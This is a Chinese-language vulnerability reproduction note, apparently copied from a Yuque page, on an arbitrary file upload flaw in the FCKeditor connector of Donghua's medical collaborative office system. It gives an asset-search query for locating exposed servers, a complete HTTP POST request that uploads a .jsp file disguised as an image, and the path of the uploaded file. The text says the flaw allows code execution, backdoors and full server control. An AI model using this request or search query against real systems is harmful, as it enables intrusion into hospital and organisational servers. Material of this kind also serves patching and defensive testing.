# 东华医疗协同办公系统 connector接口处存在任意文件上传漏洞

# 一、漏洞简介
东华oa协同办公 (DHCIOA)选用B/S结构的作业模式，以个性化效芳的门户为基础，以消息传递、信息同享、公函、作业流处理技能为中心，以先进老练的计算机和通讯技能为首要手法，供给内部网络之间的信息沟通，有效处理、和谐各部分之间的作业，提高文件处理的精确性、及时性和科学性，为企事业/政府机关单位完成无纸化作业供给完整的软件支撑，全面提高作业效率。东华医疗协同办公系统 connector接口处存在任意文件上传漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。

# 二、影响版本
+ 东华医疗协同办公系统

# 三、资产测绘
+ Hunter`web.body="/skin/charmBlue/css/dialog.css"`
+ 特征

![1705157130503-f3fa0a36-6d9a-4ef8-be4c-c35f8dc03239.png](./img/gO9SKq3KWNRMPZ_M/1705157130503-f3fa0a36-6d9a-4ef8-be4c-c35f8dc03239-510859.png)

# 四、漏洞复现
```http
POST /common/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=FileUpload&Type=&CurrentFolder=/ HTTP/1.1
Host: 
Cookie: JSESSIONID=17A17E4D9E4E38B72D650895AFF7D1DF
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryt1qdEWTI01cj5BLV
Connection: close
Content-Length: 292

------WebKitFormBoundaryt1qdEWTI01cj5BLV
Content-Disposition: form-data; name="NewFile"; filename="stc.jsp"
Content-Type: image/jpeg

123good
------WebKitFormBoundaryt1qdEWTI01cj5BLV
Content-Disposition: form-data; name="Submit"

upload
------WebKitFormBoundaryt1qdEWTI01cj5BLV--
```

![1705157687374-29e624d3-24b5-4052-a3b7-9c8c877a6e28.png](./img/gO9SKq3KWNRMPZ_M/1705157687374-29e624d3-24b5-4052-a3b7-9c8c877a6e28-024117.png)

上传文件位置

```http
/common/FCKeditor/UserFiles/stc.jsp
```

![1705157714589-d5cc4aa8-dc1b-42db-9589-640aba4960d2.png](./img/gO9SKq3KWNRMPZ_M/1705157714589-d5cc4aa8-dc1b-42db-9589-640aba4960d2-666968.png)



> 更新: 2024-02-29 23:55:42  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/yc0w19lqn3qt4ege>